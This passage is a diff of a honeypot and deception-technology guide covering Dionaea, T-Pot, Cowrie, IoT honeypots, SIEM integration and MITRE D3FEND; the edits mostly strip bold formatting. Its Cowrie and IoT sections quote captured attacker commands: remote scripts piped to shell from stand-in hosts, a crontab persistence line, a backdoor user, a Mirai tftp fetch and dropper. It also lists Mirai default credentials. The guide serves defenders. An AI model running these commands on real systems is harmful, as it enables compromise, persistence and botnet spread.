+SMB (Port 445): Emulates Windows file sharing, the most important protocol for Dionaea. Captures EternalBlue/MS17-010 exploits, WannaCry, NotPetya, and SMB-propagating worms. Dionaea implements the SMB protocol stack including DCERPC, allowing realistic service emulation.
 
-**HTTP (Port 80)**: Emulates web server. Captures drive-by download attempts, web shells uploaded to fake upload endpoints, and HTTP-based C2 communication attempts.
+HTTP (Port 80): Emulates web server. Captures drive-by download attempts, web shells uploaded to fake upload endpoints, and HTTP-based C2 communication attempts.
 
-**FTP (Port 21)**: Emulates FTP server. Captures malware that uses FTP for file transfer or drops malware via FTP.
+FTP (Port 21): Emulates FTP server. Captures malware that uses FTP for file transfer or drops malware via FTP.
 
-**MSSQL (Port 1433)**: Emulates SQL Server. Captures SQL injection attempts that lead to xp_cmdshell execution, common in early-stage compromises.
+MSSQL (Port 1433): Emulates SQL Server. Captures SQL injection attempts that lead to xp_cmdshell execution, common in early-stage compromises.
 
-**MySQL (Port 3306)**: Emulates MySQL. Captures authentication attempts and SQL injection payloads.
+MySQL (Port 3306): Emulates MySQL. Captures authentication attempts and SQL injection payloads.
 
-**SIP (Port 5060)**: Emulates VoIP SIP server. Captures VoIP toll fraud scanning.
+SIP (Port 5060): Emulates VoIP SIP server. Captures VoIP toll fraud scanning.
 
-**MEMCACHE (Port 11211)**: Emulates Memcached. Captures amplification attack reconnaissance and unauthorized data access attempts.
+MEMCACHE (Port 11211): Emulates Memcached. Captures amplification attack reconnaissance and unauthorized data access attempts.
 
-**UPNP**: Emulates Universal Plug and Play. Captures router/IoT exploitation attempts.
+UPNP: Emulates Universal Plug and Play. Captures router/IoT exploitation attempts.
 
-**TFTP**: Emulates TFTP. Common malware delivery mechanism on network devices.
+TFTP: Emulates TFTP. Common malware delivery mechanism on network devices.
 
 ### 4.3 Installation
 
-**Ubuntu/Debian**:
+Ubuntu/Debian:
 ```bash
 # Add repository
 sudo add-apt-repository ppa:honeynet/nightly
@@ -677,7 +677,7 @@ make -j4
 sudo make install
 ```
 
-**Docker**:
+Docker:
 ```bash
 docker pull dinotools/dionaea
 docker run -d   --name dionaea   -p 21:21 -p 23:23 -p 80:80 -p 443:443   -p 445:445 -p 1433:1433 -p 3306:3306   -v /opt/dionaea/var:/opt/dionaea/var   dinotools/dionaea
@@ -685,7 +685,7 @@ docker run -d   --name dionaea   -p 21:21 -p 23:23 -p 80:80 -p 443:443   -p 445:
 
 ### 4.4 Configuration
 
-**Main config** `/opt/dionaea/etc/dionaea/dionaea.cfg`:
+Main config `/opt/dionaea/etc/dionaea/dionaea.cfg`:
 ```ini
 [dionaea]
 download.dir = /opt/dionaea/var/lib/dionaea/binaries/
@@ -710,7 +710,7 @@ python = python
 curl = curl
 ```
 
-**SMB configuration** `/opt/dionaea/etc/dionaea/services-enabled/smb.yaml`:
+SMB configuration `/opt/dionaea/etc/dionaea/services-enabled/smb.yaml`:
 ```yaml
 - name: smb
   config:
@@ -732,12 +732,12 @@ Captured binaries are stored in:
     {sha256hash}.ps1
 ```
 
-**Database**: Dionaea stores incident metadata in SQLite:
+Database: Dionaea stores incident metadata in SQLite:
 ```
 /opt/dionaea/var/lib/dionaea/logsql.sqlite
 ```
 
-**Query incidents**:
+Query incidents:
 ```python
 import sqlite3
 conn = sqlite3.connect('/opt/dionaea/var/lib/dionaea/logsql.sqlite')
@@ -773,14 +773,14 @@ tail -f /opt/dionaea/var/log/dionaea/dionaea.log | grep -i "smb"
 ls -lh /opt/dionaea/var/lib/dionaea/binaries/$(date +%Y-%m-%d)/
 ```
 
-**EternalBlue indicators in logs**:
+EternalBlue indicators in logs:
 - Trans2 secondary requests (EternalBlue fingerprint)
 - DCERPC bind requests to specific UUIDs
 - Shellcode patterns in SMB payload buffers
 
 ### 4.7 SIEM Integration
 
-**Filebeat configuration** for log shipping:
+Filebeat configuration for log shipping:
 ```yaml
 filebeat.inputs:
 - type: log
@@ -796,7 +796,7 @@ output.elasticsearch:
   index: "honeypot-dionaea-%{+yyyy.MM.dd}"
 ```
 
-**Logstash filter** for Dionaea log parsing:
+Logstash filter for Dionaea log parsing:
 ```ruby
 filter {
   if [fields][source] == "dionaea" {
@@ -813,7 +813,7 @@ filter {
 
 ### 4.8 Malware Sample Submission
 
-**VirusTotal Submission**:
+VirusTotal Submission:
 ```python
 import requests
 import hashlib
@@ -852,7 +852,7 @@ for binary in glob.glob('/opt/dionaea/var/lib/dionaea/binaries/**/*.exe', recurs
     submit_to_virustotal(binary)
 ```
 
-**MalwareBazaar Submission**:
+MalwareBazaar Submission:
 ```python
 def submit_to_malwarebazaar(filepath):
     with open(filepath, 'rb') as f:
@@ -874,11 +874,11 @@ def submit_to_malwarebazaar(filepath):
 ### 4.9 Dionaea Incident Types
 
 Dionaea classifies captures into incident types:
-- **loginattempt**: Authentication attempt (with credentials)
-- **download**: Successful malware download captured
-- **reject**: Connection rejected after protocol exchange
-- **scan**: Port scan detected
-- **blackhole**: Connection to non-listening service
+- loginattempt: Authentication attempt (with credentials)
+- download: Successful malware download captured
+- reject: Connection rejected after protocol exchange
+- scan: Port scan detected
+- blackhole: Connection to non-listening service
 
 Each incident is stored in the SQLite database with source IP, destination port, timestamp, and protocol-specific data such as captured credentials or downloaded binary hash.
 ## Part 5: T-Pot and Cowrie
@@ -887,7 +887,7 @@ Each incident is stored in the SQLite database with source IP, destination port,
 
 T-Pot is the all-in-one, multi-honeypot platform developed by Deutsche Telekom Security. It packages 20+ honeypots in a Docker Compose environment with full ELK stack integration, providing a comprehensive honeypot deployment with built-in visualization.
 
-**Key Features**:
+Key Features:
 - 20+ honeypots running simultaneously
 - Elasticsearch + Logstash + Kibana for log analysis
 - Pre-built Kibana dashboards for each honeypot type
@@ -899,7 +899,7 @@ T-Pot is the all-in-one, multi-honeypot platform developed by Deutsche Telekom S
 
 ### 5.2 T-Pot Installation
 
-**Requirements**: Debian 11/12 or Ubuntu 22.04, minimum 8GB RAM, 128GB storage, static IP
+Requirements: Debian 11/12 or Ubuntu 22.04, minimum 8GB RAM, 128GB storage, static IP
 
 ```bash
 # Download and run installer
@@ -928,54 +928,54 @@ ssh -p 64295 user@your-tpot-ip
 
 ### 5.3 Included Honeypots
 
-**Cowrie**: SSH/Telnet medium-interaction honeypot (see Section 5.5)
+Cowrie: SSH/Telnet medium-interaction honeypot (see Section 5.5)
 
-**Dionaea**: Malware capture honeypot for SMB, HTTP, FTP (see Section 4)
+Dionaea: Malware capture honeypot for SMB, HTTP, FTP (see Section 4)
 
-**Elasticpot**: Elasticsearch honeypot on port 9200. Captures attackers targeting misconfigured ES instances. Common attack pattern: querying index list followed by data exfiltration.
+Elasticpot: Elasticsearch honeypot on port 9200. Captures attackers targeting misconfigured ES instances. Common attack pattern: querying index list followed by data exfiltration.
 
-**HoneyPy**: Modular Python honeypot (see Section 6.1)
+HoneyPy: Modular Python honeypot (see Section 6.1)
 
-**Honeytrap**: Go-based honeypot that dynamically creates listeners on probed ports. Any port scan that hits a closed port gets a listener created for that port on subsequent connections.
+Honeytrap: Go-based honeypot that dynamically creates listeners on probed ports. Any port scan that hits a closed port gets a listener created for that port on subsequent connections.
 
-**Mailoney**: SMTP honeypot. Captures email spam relay attempts and credential stuffing against mail servers.
+Mailoney: SMTP honeypot. Captures email spam relay attempts and credential stuffing against mail servers.
 
-**Rdpy**: RDP honeypot. Captures Remote Desktop Protocol connection attempts and credential attacks. Critical for detecting lateral movement in Windows environments.
+Rdpy: RDP honeypot. Captures Remote Desktop Protocol connection attempts and credential attacks. Critical for detecting lateral movement in Windows environments.
 
-**Snare/Tanner**: Web application honeypot (see Section 6.2)
+Snare/Tanner: Web application honeypot (see Section 6.2)
 
-**Heralding**: Credential capture honeypot supporting FTP, HTTP, HTTPS, SSH, SMTP, POP3, IMAP, LDAP, MSSQL, MySQL, PostgreSQL, RDP, VNC.
+Heralding: Credential capture honeypot supporting FTP, HTTP, HTTPS, SSH, SMTP, POP3, IMAP, LDAP, MSSQL, MySQL, PostgreSQL, RDP, VNC.
 
-**CitrixHoneypot**: Emulates Citrix ADC (CVE-2019-19781) to capture exploitation attempts.
+CitrixHoneypot: Emulates Citrix ADC (CVE-2019-19781) to capture exploitation attempts.
 
-**ConPot**: ICS/SCADA honeypot. Emulates Siemens S7 PLC, Modbus, DNP3. Critical for OT/ICS environments.
+ConPot: ICS/SCADA honeypot. Emulates Siemens S7 PLC, Modbus, DNP3. Critical for OT/ICS environments.
 
-**GridPot**: Smart grid honeypot implementing DNP3 and IEC 60870 protocols.
+GridPot: Smart grid honeypot implementing DNP3 and IEC 60870 protocols.
 
-**IPPHoney**: Internet Printing Protocol honeypot on port 631. Captures printer exploitation attempts.
+IPPHoney: Internet Printing Protocol honeypot on port 631. Captures printer exploitation attempts.
 
-**ADBHoney**: Android Debug Bridge honeypot on port 5555. Captures Android device exploitation (common in IoT botnet activity).
+ADBHoney: Android Debug Bridge honeypot on port 5555. Captures Android device exploitation (common in IoT botnet activity).
 
-**CiscoASA**: Emulates Cisco ASA VPN to capture CVE-2018-0101 and similar ASA exploits.
+CiscoASA: Emulates Cisco ASA VPN to capture CVE-2018-0101 and similar ASA exploits.
 
-**Log4Pot**: Log4Shell (CVE-2021-44228) honeypot. Captures JNDI injection attempts.
+Log4Pot: Log4Shell (CVE-2021-44228) honeypot. Captures JNDI injection attempts.
 
 ### 5.4 Kibana Dashboards
 
 T-Pot provides pre-built Kibana dashboards:
-- **T-Pot Overview**: All honeypot activity summary
-- **Attack Map**: Real-time world map of attack origins
-- **Cowrie Dashboard**: SSH/Telnet specific analytics
-- **Suricata Dashboard**: IDS alert correlation
-- **Individual honeypot dashboards**: One per included honeypot
+- T-Pot Overview: All honeypot activity summary
+- Attack Map: Real-time world map of attack origins
+- Cowrie Dashboard: SSH/Telnet specific analytics
+- Suricata Dashboard: IDS alert correlation
+- Individual honeypot dashboards: One per included honeypot
 
-**Community Feed**: T-Pot installations optionally contribute anonymized attack data to the T-Pot community feed, providing global threat intelligence aggregation.
+Community Feed: T-Pot installations optionally contribute anonymized attack data to the T-Pot community feed, providing global threat intelligence aggregation.
 
 ### 5.5 Cowrie SSH/Telnet Honeypot
 
 Cowrie is the most widely deployed medium-interaction SSH/Telnet honeypot. It presents a convincing fake shell environment to attackers, recording their every command.
 
-**Installation (standalone)**:
+Installation (standalone):
 ```bash
 # Create dedicated user
 sudo adduser --disabled-password cowrie
@@ -1049,7 +1049,7 @@ var/log/cowrie/tty/
   20240115-143022-192.168.1.100-1234.ttylog   # ttyrec recording
 ```
 
-**Playback**:
+Playback:
 ```bash
 # Replay attacker session
 bin/playlog var/log/cowrie/tty/20240115-143022-192.168.1.100-1234.ttylog
@@ -1057,7 +1057,7 @@ bin/playlog var/log/cowrie/tty/20240115-143022-192.168.1.100-1234.ttylog
 
 ### 5.8 Common Captured Behaviors
 
-**Cryptocurrency Miners**: The most common payload. Attackers download xmrig or similar miners:
+Cryptocurrency Miners: The most common payload. Attackers download xmrig or similar miners:
 ```bash
 # Typical captured commands:
 wget http://malicious.site/miner.sh -O /tmp/.x
@@ -1067,7 +1067,7 @@ chmod +x /tmp/.x
 curl http://c2.example.com/install.sh | bash
 ```
 
-**Lateral Movement Attempts**:
+Lateral Movement Attempts:
 ```bash
 # Captured reconnaissance commands:
 cat /etc/passwd
@@ -1082,7 +1082,7 @@ whoami
 id
 ```
 
-**Persistence Mechanisms**:
+Persistence Mechanisms:
 ```bash
 # Captured persistence attempts:
 echo "* * * * * curl http://c2/payload | bash" >> /etc/crontab
@@ -1092,14 +1092,14 @@ useradd -m -s /bin/bash -G sudo backdoor
 
 ### 5.9 Cowrie Output Plugins
 
-**JSON Log** (default): Structured JSON for SIEM ingestion
-**ELK Output**: Direct Elasticsearch output
-**MISP**: Threat intelligence platform integration
-**Splunk**: HEC (HTTP Event Collector) output
-**Slack**: Real-time notifications
-**VirusTotal**: Automatic submission of downloaded malware
+JSON Log (default): Structured JSON for SIEM ingestion
+ELK Output: Direct Elasticsearch output
+MISP: Threat intelligence platform integration
+Splunk: HEC (HTTP Event Collector) output
+Slack: Real-time notifications
+VirusTotal: Automatic submission of downloaded malware
 
-**Splunk HEC configuration**:
+Splunk HEC configuration:
 ```ini
 [output_splunk]
 enabled = true
@@ -1109,7 +1109,7 @@ index = honeypot
 sourcetype = cowrie
 ```
 
-**MISP output configuration**:
+MISP output configuration:
 ```ini
 [output_misp]
 enabled = true
@@ -1125,7 +1125,7 @@ tags = honeypot, cowrie, tlp:amber
 
 HoneyPy is a low-interaction, modular honeypot written in Python. Its plugin architecture makes it highly customizable for specific environments.
 
-**Installation**:
+Installation:
 ```bash
 git clone https://github.com/foospidy/HoneyPy.git
 cd HoneyPy
@@ -1139,7 +1139,7 @@ cp etc/honeypy.cfg.example etc/honeypy.cfg
 python honeypy.py
 ```
 
-**Configuration** `etc/honeypy.cfg`:
+Configuration `etc/honeypy.cfg`:
 ```ini
 [honeypy]
 log_file = log/honeypy.log
@@ -1156,7 +1156,7 @@ tcp_service_example = True
 udp_service_example = False
 ```
 
-**Available Plugins**:
+Available Plugins:
 - `Adb`: Android Debug Bridge (port 5555)
 - `Chargen`: Character generator protocol
 - `Daytime`: Daytime protocol
@@ -1178,7 +1178,7 @@ udp_service_example = False
 - `Tftp`: TFTP service
 - `Vnc`: VNC service
 
-**Custom Plugin Development**:
+Custom Plugin Development:
 ```python
 # HoneyPy plugin template
 from twisted.internet.protocol import Protocol, Factory
@@ -1211,15 +1211,15 @@ class MyServiceFactory(Factory):
         self.port = port
 ```
 
-### 6.2 SNARE and Tanner — Web Application Honeypot
+### 6.2 SNARE and Tanner: Web Application Honeypot
 
-**SNARE** (Super Next Generation Advanced Reactive Honeypot) clones real websites to create convincing web application honeypots. **Tanner** is the backend analysis engine that classifies attacks.
+SNARE (Super Next Generation Advanced Reactive Honeypot) clones real websites to create convincing web application honeypots. Tanner is the backend analysis engine that classifies attacks.
 
-**Architecture**:
+Architecture:
 - SNARE: Web server that presents cloned pages and captures HTTP requests
 - Tanner: Analysis server that receives captured requests from SNARE and classifies attack types
 
-**SNARE Installation**:
+SNARE Installation:
 ```bash
 pip install snare
 
@@ -1230,7 +1230,7 @@ sudo snare --cloner http://example.com --dir /opt/snare/pages/
 sudo snare --port 8080 --page-dir /opt/snare/pages/example.com     --tanner 127.0.0.1 --no-dorks false
 ```
 
-**Tanner Installation**:
+Tanner Installation:
 ```bash
 pip install tanner
 
@@ -1241,17 +1241,17 @@ redis-server &
 tanner
 ```
 
-**Attack Classification** (Tanner):
-- **SQL Injection (SQLi)**: Detected via pattern matching and actual query execution against SQLite
-- **Cross-Site Scripting (XSS)**: Detected via script injection patterns
-- **Local File Inclusion (LFI)**: Detected via path traversal patterns
-- **Remote File Inclusion (RFI)**: Detected via URL inclusion patterns
-- **XML External Entity (XXE)**: Detected via XML payload analysis
-- **Server-Side Template Injection (SSTI)**: Detected via template expression patterns
-- **Command Injection**: Detected via shell metacharacter patterns
-- **CSRF**: Detected via cross-origin request patterns
+Attack Classification (Tanner):
+- SQL Injection (SQLi): Detected via pattern matching and actual query execution against SQLite
+- Cross-Site Scripting (XSS): Detected via script injection patterns
+- Local File Inclusion (LFI): Detected via path traversal patterns
+- Remote File Inclusion (RFI): Detected via URL inclusion patterns
+- XML External Entity (XXE): Detected via XML payload analysis
+- Server-Side Template Injection (SSTI): Detected via template expression patterns
+- Command Injection: Detected via shell metacharacter patterns
+- CSRF: Detected via cross-origin request patterns
 
-**Tanner configuration** `~/.tanner/tanner.cfg`:
+Tanner configuration `~/.tanner/tanner.cfg`:
 ```yaml
 [Redis]
 host: localhost
@@ -1274,7 +1274,7 @@ port: 8090
 
 IoT botnets (especially Mirai and its variants) heavily target Telnet (port 23) with default credential brute-forcing. Specialized IoT honeypots capture these attacks.
 
-**telnet-iot-honeypot**:
+telnet-iot-honeypot:
 ```bash
 git clone https://github.com/Phype/telnet-iot-honeypot
 cd telnet-iot-honeypot
@@ -1282,7 +1282,7 @@ pip install -r requirements.txt
 python honeypot.py
 ```
 
-**Captured Mirai Infection Sequence**:
+Captured Mirai Infection Sequence:
 1. Scanner bot connects to Telnet (port 23)
 2. Attempts default credentials (admin/admin, root/root, root/xc3511, etc.)
 3. Upon successful authentication, runs `uname -a` to identify architecture
@@ -1299,7 +1299,7 @@ tftp -g -r mirai.mips malware.site
 ```
 5. Binary executes and phones home to C2
 
-**Captured Default Credential List** (common Mirai targets):
+Captured Default Credential List (common Mirai targets):
 ```
 root:xc3511, root:vizxv, root:admin, admin:admin, root:888888
 root:xmhdipc, root:default, root:juantech, root:123456, root:54321
@@ -1307,7 +1307,7 @@ support:support, root:root, admin:password, root:1111111, admin:1234
 root:66666666, root:password, root:1234, admin:12345, user:user
 ```
 
-### 6.4 MTPot — Telnet IoT Honeypot
+### 6.4 MTPot: Telnet IoT Honeypot
 
 MTPot is a simple Telnet honeypot specifically designed to capture IoT malware:
 
@@ -1323,7 +1323,7 @@ cp config.ini.example config.ini
 python mtpot.py
 ```
 
-### 6.5 ElasticHoney — Elasticsearch Honeypot
+### 6.5 ElasticHoney: Elasticsearch Honeypot
 
 Targets Elasticsearch exposed on port 9200, one of the most commonly exploited internet-facing services:
 
@@ -1339,7 +1339,7 @@ cp config.example.json config.json
 ./elastichoney
 ```
 
-**Common captured attacks against Elasticsearch**:
+Common captured attacks against Elasticsearch:
 ```
 GET /_cat/indices
 GET /_cluster/stats
@@ -1350,20 +1350,20 @@ GET /users/_search?q=*:*&size=9999
 
 ### 6.6 Common IoT Attacker Patterns
 
-**Architecture Detection**: Attackers check CPU architecture before downloading appropriate binary:
+Architecture Detection: Attackers check CPU architecture before downloading appropriate binary:
 ```bash
 uname -a  # Common first command
 cat /proc/cpuinfo  # Architecture details
 ```
 
-**Multi-Architecture Dropper** (common captured dropper script):
+Multi-Architecture Dropper (common captured dropper script):
 ```bash
 #!/bin/sh
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
 wget -q http://malware.site/install.sh -O- | sh
 ```
 
-**Persistence on IoT devices**:
+Persistence on IoT devices:
 ```bash
 # Attempt to survive reboots
 echo "*/1 * * * * /tmp/.x" >> /etc/crontabs/root
@@ -1374,13 +1374,13 @@ kill $(cat /tmp/.pid)
 rm /tmp/.pid
 ```
 
-**Botnet Commands Observed**:
+Botnet Commands Observed:
 - DDoS flood commands (UDP/TCP/HTTP flood)
 - Port scan commands (internal network spreading)
 - Credential brute-force relay commands
 - Proxy/SOCKS setup for anonymization
 
-### 6.7 ADBHoney — Android Debug Bridge Honeypot
+### 6.7 ADBHoney: Android Debug Bridge Honeypot
 
 ADBHoney emulates the Android Debug Bridge port (5555/TCP), commonly targeted by Android malware distribution botnets:
 
@@ -1391,7 +1391,7 @@ pip install -r requirements.txt
 python adbhoney.py --port 5555
 ```
 
-**Common ADB attack patterns**:
+Common ADB attack patterns:
 ```bash
 # Attacker commands captured via ADB:
 adb connect target:5555
@@ -1400,21 +1400,21 @@ adb shell am start -n com.malware/.MainActivity
 adb shell monkey -p com.malware 1
 ```
 
-**Notable captured malware**: Satori, Fbot, and other Mirai-derived botnets extended their scanning to include ADB port 5555 after discovering millions of exposed Android devices (primarily Android TV boxes and phones with debug mode enabled).
+Notable captured malware: Satori, Fbot, and other Mirai-derived botnets extended their scanning to include ADB port 5555 after discovering millions of exposed Android devices (primarily Android TV boxes and phones with debug mode enabled).
 ## Part 7: Enterprise Deception at Scale
 
 ### 7.1 Coverage Model
 
 Enterprise deception deployment follows a density-based coverage model. The goal is to ensure that any attacker performing lateral movement, network discovery, or credential access will encounter a decoy.
 
-**Recommended Density**:
-- **One honeypot per VLAN/subnet**: At minimum, one honeypot system per network segment. Prefer 2-3 per segment for redundancy and protocol coverage.
-- **One honeytoken per sensitive file share**: Every file share containing sensitive data should have at least one honeyfile with embedded callback.
-- **One decoy account per Active Directory OU**: Decoy service accounts in each OU, with monitoring for any authentication attempt.
-- **One canary credential per credential store**: Fake credentials in every password manager, secrets vault, and configuration file repository.
-- **One fake admin share per server**: UNC paths to non-existent admin shares that trigger alerts on access attempt.
+Recommended Density:
+- One honeypot per VLAN/subnet: At minimum, one honeypot system per network segment. Prefer 2-3 per segment for redundancy and protocol coverage.
+- One honeytoken per sensitive file share: Every file share containing sensitive data should have at least one honeyfile with embedded callback.
+- One decoy account per Active Directory OU: Decoy service accounts in each OU, with monitoring for any authentication attempt.
+- One canary credential per credential store: Fake credentials in every password manager, secrets vault, and configuration file repository.
+- One fake admin share per server: UNC paths to non-existent admin shares that trigger alerts on access attempt.
 
-**Coverage Calculation**:
+Coverage Calculation:
 ```
 Coverage_Score = (Monitored_Paths / Total_Attacker_Paths) x 100%
 
@@ -1430,7 +1430,7 @@ Where Total_Attacker_Paths includes:
 
 Each honeypot node should emulate multiple services to maximize detection surface:
 
-**Windows Server Decoy**:
+Windows Server Decoy:
 - SMB (445): File sharing
 - RDP (3389): Remote desktop
 - WinRM (5985/5986): Remote management
@@ -1438,7 +1438,7 @@ Each honeypot node should emulate multiple services to maximize detection surfac
 - HTTP/HTTPS (80/443): IIS web server
 - LDAP (389): Domain controller emulation
 
-**Linux Server Decoy**:
+Linux Server Decoy:
 - SSH (22): Remote access
 - HTTP/HTTPS (80/443): Web server
 - MySQL (3306): Database
@@ -1446,14 +1446,14 @@ Each honeypot node should emulate multiple services to maximize detection surfac
 - Docker API (2375): Container management
 - Kubernetes API (6443): Orchestration
 
-**Network Infrastructure Decoy**:
+Network Infrastructure Decoy:
 - SNMP (161): Network management
 - Telnet (23): Legacy management
 - SSH (22): Network device management
 - HTTP (80): Web management interface
 - TFTP (69): Configuration download
 
-**Database Server Decoy**:
+Database Server Decoy:
 - MySQL (3306)
 - PostgreSQL (5432)
 - MSSQL (1433)
@@ -1464,7 +1464,7 @@ Each honeypot node should emulate multiple services to maximize detection surfac
 
 ### 7.3 Commercial Deception Platforms
 
-**Attivo Networks (now part of SentinelOne)**:
+Attivo Networks (now part of SentinelOne):
 - Automated decoy deployment and management
 - Dynamic decoy refresh to prevent fingerprinting
 - Active Directory assessment and canary accounts
@@ -1472,37 +1472,37 @@ Each honeypot node should emulate multiple services to maximize detection surfac
 - Automated incident response integration
 - Cloud (AWS/Azure/GCP) deception coverage
 
-**SentinelOne Singularity Ranger Deception**:
+SentinelOne Singularity Ranger Deception:
 - Agent-based deception on existing endpoints
 - Fake credentials and files planted by the agent
 - Network decoys created dynamically
 - Integration with SentinelOne EDR for correlated response
 - Identity-based deception (fake cached credentials)
 
-**Illusive Networks**:
+Illusive Networks:
 - Agentless deception via network-level injection
 - Deceptive credentials planted in memory without agents
 - Active Directory deception
 - Attack surface reduction through deception data analysis
 - Real-time attacker visualization
 
-**Acalvio ShadowPlex**:
+Acalvio ShadowPlex:
 - Fluid deception: decoys that adapt to network changes
 - Autonomous deception planning using AI
 - Cloud and OT/ICS support
 - Threat dossier generation for each attacker session
 - Integration with SOAR platforms
 
-**Cymmetria MazeRunner** (acquired by CrowdStrike):
+Cymmetria MazeRunner (acquired by CrowdStrike):
 - Breadcrumb planting for attacker misdirection
 - Deception grid deployment
 - Trail analysis for attacker path reconstruction
 
 ### 7.4 SIEM Integration Architecture
 
-**Integration Principle**: ALL honeypot alerts = P1 priority. No tuning, no threshold, no false positives. Any alert from a honeypot system demands immediate investigation.
+Integration Principle: ALL honeypot alerts = P1 priority. No tuning, no threshold, no false positives. Any alert from a honeypot system demands immediate investigation.
 
-**Syslog Integration** (universal):
+Syslog Integration (universal):
 ```yaml
 # Filebeat configuration for all honeypots
 filebeat.inputs:
@@ -1520,7 +1520,7 @@ output.logstash:
   hosts: ["siem.corp.example.com:5044"]
 ```
 
-**Microsoft Sentinel Integration** (KQL analytics rule):
+Microsoft Sentinel Integration (KQL analytics rule):
 ```kql
 Syslog
 | where HostName has_any ("honeypot", "canary", "decoy")
@@ -1531,7 +1531,7 @@ Syslog
 | project TimeGenerated, HostName, SyslogMessage, Computer, AlertPriority
 ```
 
-**Splunk Integration**:
+Splunk Integration:
 ```spl
 index=honeypot
 | eval priority="P1"
@@ -1541,7 +1541,7 @@ index=honeypot
 | table src_ip, honeypot_type, service, count, priority
 ```
 
-**Palo Alto XSOAR Playbook** (triggered on honeypot alert):
+Palo Alto XSOAR Playbook (triggered on honeypot alert):
 1. Immediately block source IP at perimeter firewall
 2. Query SIEM for other activity from same source IP
 3. Check EDR for any endpoints communicating with source IP
@@ -1552,7 +1552,7 @@ index=honeypot
 
 ### 7.5 Threat Intelligence Extraction
 
-**TTPs (Tactics, Techniques, Procedures)**:
+TTPs (Tactics, Techniques, Procedures):
 ```python
 import json
 from pymisp import PyMISP, MISPEvent
@@ -1574,7 +1574,7 @@ def process_cowrie_log(log_file):
                 misp.add_event(event)
 ```
 
-**Malware C2 Extraction**:
+Malware C2 Extraction:
 ```python
 import re
 
@@ -1594,21 +1594,21 @@ def extract_c2_from_commands(commands):
 
 ### 7.6 KPIs and Metrics
 
-**Primary KPIs**:
-- **Intrusion Detection Rate**: Percentage of intrusions detected by honeypots vs. total intrusions
-- **Mean Time to Detect (MTTD)**: Average time from honeypot alert to SOC acknowledgment (target: under 15 minutes)
-- **Attack Path Intelligence**: Number of unique attacker TTPs documented per quarter
-- **Honeypot Coverage**: Percentage of network segments with at least one active honeypot
-- **Alert Fidelity**: All honeypot alerts are true positives (100% by definition)
+Primary KPIs:
+- Intrusion Detection Rate: Percentage of intrusions detected by honeypots vs. total intrusions
+- Mean Time to Detect (MTTD): Average time from honeypot alert to SOC acknowledgment (target: under 15 minutes)
+- Attack Path Intelligence: Number of unique attacker TTPs documented per quarter
+- Honeypot Coverage: Percentage of network segments with at least one active honeypot
+- Alert Fidelity: All honeypot alerts are true positives (100% by definition)
 
-**Secondary KPIs**:
+Secondary KPIs:
 - Malware samples captured per month
 - Unique attacker IPs observed
 - New C2 infrastructure identified
 - Credential stuffing attempts (per service)
 - Geographic distribution of attacks
 
-**Monthly Report Template**:
+Monthly Report Template:
 ```
 Honeypot Activity Report
 =========================================
@@ -1625,12 +1625,12 @@ Incidents Escalated: N
 
 The most effective enterprise deception programs layer multiple deception technologies:
 
-**Layer 1 — Network**: Honeypot VMs on every VLAN (OpenCanary or T-Pot)
-**Layer 2 — Service**: Protocol-specific emulation for common attacker targets
-**Layer 3 — Identity**: AD canary accounts, AWS honey keys, cached fake credentials
-**Layer 4 — Data**: Honeyfiles in every sensitive share, canarytoken documents
-**Layer 5 — Application**: Web app honeypots for internet-facing services
-**Layer 6 — Cloud**: Decoy S3 buckets, fake Lambda functions, canary cloud API keys
+Layer 1 — Network: Honeypot VMs on every VLAN (OpenCanary or T-Pot)
+Layer 2 — Service: Protocol-specific emulation for common attacker targets
+Layer 3 — Identity: AD canary accounts, AWS honey keys, cached fake credentials
+Layer 4 — Data: Honeyfiles in every sensitive share, canarytoken documents
+Layer 5 — Application: Web app honeypots for internet-facing services
+Layer 6 — Cloud: Decoy S3 buckets, fake Lambda functions, canary cloud API keys
 
 With all six layers active, attacker detection probability exceeds 95% for any lateral movement attempt within the network. The remaining 5% represents highly targeted, slow-and-low attacks that deliberately avoid known deception indicators — a level of sophistication that itself indicates an advanced persistent threat (APT).
 ## Part 8: MITRE D3FEND and ATT&CK Mapping
@@ -1639,42 +1639,42 @@ With all six layers active, attacker detection probability exceeds 95% for any l
 
 MITRE D3FEND is the defensive complement to ATT&CK, providing a knowledge base of defensive cybersecurity techniques. The deception category includes:
 
-**D3-HN: Honeypot Network**
+D3-HN: Honeypot Network
 - Definition: A network of decoy systems designed to attract and monitor attackers
 - Implementation: Dedicated VLAN with honeypot systems, isolated from production
 - Detection Coverage: Network reconnaissance, lateral movement, exploitation attempts
 - Related ATT&CK: T1046, T1135, T1021, T1190
 - Platforms: All (network-level)
 
-**D3-HS: Honeypot Service**
+D3-HS: Honeypot Service
 - Definition: A decoy network service that appears to be a legitimate service but exists solely to detect unauthorized access
 - Implementation: OpenCanary, Cowrie, Dionaea, HoneyPy
 - Detection Coverage: Service exploitation, credential brute-force, protocol abuse
 - Related ATT&CK: T1110, T1078, T1021, T1190
 - Platforms: All (service-level)
 
-**D3-DA: Decoy Account**
+D3-DA: Decoy Account
 - Definition: A user account created specifically to detect unauthorized credential use
 - Implementation: AD canary accounts, AWS IAM honey keys, local admin decoys
 - Detection Coverage: Credential theft, pass-the-hash, golden ticket attacks
 - Related ATT&CK: T1078, T1110, T1555, T1558
 - Platforms: Windows, Linux, Cloud
 
-**D3-DF: Decoy File**
+D3-DF: Decoy File
 - Definition: A file that appears to contain sensitive information but exists to detect unauthorized access
 - Implementation: Canarytokens Word/PDF, inotify-watched honeyfiles
 - Detection Coverage: Data exfiltration, insider threat, ransomware reconnaissance
 - Related ATT&CK: T1083, T1005, T1074, T1530
 - Platforms: Windows, Linux, macOS, Cloud Storage
 
-**D3-DU: Decoy Credential**
+D3-DU: Decoy Credential
 - Definition: Fake credentials (passwords, keys, tokens) planted to detect credential theft
 - Implementation: Fake passwords in browsers, fake API keys in config files, canary SSH keys
 - Detection Coverage: Credential harvesting, credential spraying, C2 pivoting
 - Related ATT&CK: T1555, T1552, T1212, T1110
 - Platforms: All
 
-**D3-DN: Decoy Network Resource**
+D3-DN: Decoy Network Resource
 - Definition: Fake network resources (shares, printers, services) that attract attacker enumeration
 - Implementation: Phantom SMB shares, fake printers, decoy intranet pages
 - Detection Coverage: Network share discovery, resource enumeration
@@ -1708,27 +1708,27 @@ MITRE D3FEND is the defensive complement to ATT&CK, providing a knowledge base o
 
 ### 8.3 Detection Coverage by Attack Phase
 
-**Reconnaissance Phase** (ATT&CK TA0043):
+Reconnaissance Phase (ATT&CK TA0043):
 - Honeypots detect: Active scanning (T1595), network service scanning (T1046), host discovery
